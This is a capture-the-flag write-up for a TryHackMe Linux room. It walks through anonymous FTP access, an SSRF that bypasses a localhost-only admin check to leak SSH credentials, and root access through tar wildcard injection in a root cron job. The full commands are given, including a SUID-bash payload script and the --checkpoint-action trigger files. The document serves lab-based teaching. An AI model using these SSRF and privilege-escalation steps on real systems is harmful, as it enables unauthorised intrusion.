<div style="display: flex; align-items: center; gap: 1rem;">
	<img src="https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1779217928574" alt="Silent Monitor" width="100" height="100">
	<h1>Operation Coldstart — Write-up</h1>
</div>
<br>
**Platform:** TryHackMe  
**Room:** [Operation Coldstart](https://tryhackme.com/room/operationcoldstart)  
**Difficulty:** Easy  
**Category:** Linux  

## Scenario
Volt Labs, a small SaaS shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.

## Reconnaissance
We starting with an nmap scan of the target machine to identify open ports and services. The scan revealed the following:

```bash
nmap -Pn -sT -sV -n -T4 -p- -oN scan.txt coldstart.thm
```

![Nmap Scan Results](https://i.postimg.cc/Nf9fQQkH/Screenshot-From-2026-09-10-22-04-10.png)

The scan results show that the target machine has the following open ports:
- Port 21: FTP (vsftpd 3.0.5)
- Port 22: SSH (OpenSSH 9.6p1)
- Port 80: HTTP (Gunicorn)

## FTP Enumeration

The first thing got on my mind was to check the FTP service. I tried to connect to the FTP server using anonymous login:

```bash
ftp coldstart.thm 21
```

![FTP Connection](https://i.postimg.cc/TPCXrscp/Screenshot-From-2026-09-10-22-10-55.png)

As we can see, the FTP server allows anonymous login. After logging in, I listed the files in the root directory, and found a `pub` directory. Navigating into the `pub` directory, I found a file named `backup.tar.gz`. I downloaded the file to my local machine for further analysis:

```bash
get backup.tar.gz
```

After downloading the file, I extracted it. I found a directory named `voltlabs-preview` which contained three files: `README.md`, `app.py`, and `requirements.txt`.

![Extracted Files](https://i.postimg.cc/m2ycvLL5/Screenshot-From-2026-09-10-22-30-44.png)

```
cat README.md

# Volt Labs URL Preview

Internal staging tool. Run with `gunicorn -b 0.0.0.0:80 app:app`.

Admin routes are gated by source-IP check (localhost only).
```
## Enumrating the Flask app

According the README file, the application is a URL preview tool that runs on Gunicorn and has admin routes that are only accessible from localhost.

After that, I started to analyze the `app.py` file. The application is a Flask web application with three routes:

* `/` - a form to submit a URL.

![route](https://i.postimg.cc/HkWJHqnB/Screenshot-From-2026-09-10-22-35-35.png)

* `/preview?url=...` - fetches whatever URL you give it (via `requests.get`) and echoes the response body back to you, but only if `urlparse(target).hostname` is in `ALLOWED_HOSTS = {"kestrel.thm"}`

![route](https://i.postimg.cc/sgfBykxL/Screenshot-From-2026-09-10-22-36-00.png)

* `/admin/` and `/admin/<path>` — checks `request.remote_addr.startswith("127.")`, and if `p == "notes"`, reads and returns `/opt/voltlabs-preview/admin_notes.txt`.

![route](https://i.postimg.cc/VksS1xv4/Screenshot-From-2026-09-10-22-36-23.png)

The comment in the code basically spells it out: the allow-list only checks the **hostname string**, not scheme, path, or where that hostname actually resolves to. And per the README, `kestrel.thm` resolves to `127.0.0.1` on this box (via `/etc/hosts`).

![comment](https://i.postimg.cc/3wndpwcP/Screenshot-From-2026-09-10-22-47-21.png)

So the intended exploit path is:

1. `/preview` lets us make the server itself issue an HTTP request to any path on `kestrel.thm` (since only the hostname is checked, not the path).
2. Since `kestrel.thm` → `127.0.0.1`, that request actually lands back on the same Flask app, on `127.0.0.1`.
3. `/admin/notes` only checks that `remote_addr` starts with `127.` — and since the request is now coming from the app hitting itself locally, it satisfies that check even though you (the external attacker) are not on localhost.
4. That means we can use `/preview` as a proxy to read `/admin/notes`, which dumps the contents of `admin_notes.txt`.

In short: **SSRF via the hostname allow-list → used to bypass the IP-based admin auth, because the SSRF request originates from localhost.**

## Shell as webdev

I try hitting the preview endpoint with a URL that targets the admin notes path on the allowed host:

```bash
http://coldstart.thm/preview?url=http://kestrel.thm/admin/notes
```

![ssh creds](https://i.postimg.cc/zvbfVNKX/Screenshot-From-2026-09-10-23-32-53.png)

As we can see, the request went through and the response was reflected back into the preview page. The contents of `admin_notes.txt` gave us SSH credentials for a low-privileged user, `webdev`.

Using these, I logged in over SSH:
 
```bash
ssh webdev@coldstart.thm
```

![ssh login](https://i.postimg.cc/tR10zPFQ/Screenshot-From-2026-09-11-16-06-36.png)
 
This gave a foothold as `webdev` on the box.

## Tar Wildcard Injection

Most of `/etc/cron.d/` and `/etc/cron.daily/` was standard, dated back to 2017–2024. One entry stood out — `/etc/cron.d/voltlabs-backup`, dropped just days before the box was built:
 
```bash
cat /etc/cron.d/voltlabs-backup
```
 
```
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```
![cron](https://i.postimg.cc/BtWBTRHP/Screenshot-From-2026-09-11-16-36-08.png)

This is the box's intended privesc path.

The cron entry runs as root, every minute, and calls:
 
```bash
cd /opt/backups && tar czf /var/backups/uploads.tgz *
```
 
The bare `*` is the vulnerability. Because the shell expands the wildcard before `tar` ever runs, any filename inside `/opt/backups` that starts with `-` gets passed to `tar` as a command-line **option** instead of a file to archive. `tar` supports `--checkpoint` and `--checkpoint-action=exec=<command>`, which together let us who can write to that directory run arbitrary commands as root. This is the classic wildcard argument injection technique documented on [GTFOBins](https://gtfobins.github.io/#tar) under `tar`.
 
First, confirm `webdev` can write to the backup directory:
 
```bash
ls -la /opt/backups
```
 
![backups perms](https://i.postimg.cc/nM8G4NBs/Screenshot-From-2026-09-11-16-39-05.png)
 
With write access confirmed, the exploit is four steps:

**1. Drop a payload script:**
 
```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /opt/backups/shell.sh
chmod +x /opt/backups/shell.sh
```
 
**2. Create the tar trigger files** in the same directory:
 
```bash
touch /opt/backups/--checkpoint=1
touch /opt/backups/--checkpoint-action=exec=sh\ shell.sh
```
 
When the cron fires, the shell expands `*` to include these filenames alongside the real ones, and `tar` parses them as:
 
```
--checkpoint=1 --checkpoint-action=exec=sh shell.sh
```
 
**3. Wait for the cron to fire** (it runs every minute).
 
**4. Catch the result:**
 
```bash
ls -la /tmp/rootbash
```
 
Once `/tmp/rootbash` shows up with the SUID bit set, we drop into a root shell:
 
```bash
/tmp/rootbash -p
```
 
![root shell](https://i.postimg.cc/vDRtrCfD/Screenshot-From-2026-09-11-16-41-48.png)

## Root
 
```bash
id
cat /root/flag.txt
```
 
```
uid=1001(webdev) gid=1001(webdev) euid=0(root) egid=0(root) groups=0(root),1001(webdev)
'REDACTED'
```

![root](https://i.postimg.cc/FFftxc0X/Screenshot-From-2026-09-11-16-43-16.png)

That's it! We have successfully pwned the target machine and captured both user and root flags. hope you enjoyed this write-up. If you have any questions or suggestions, feel free to reach out.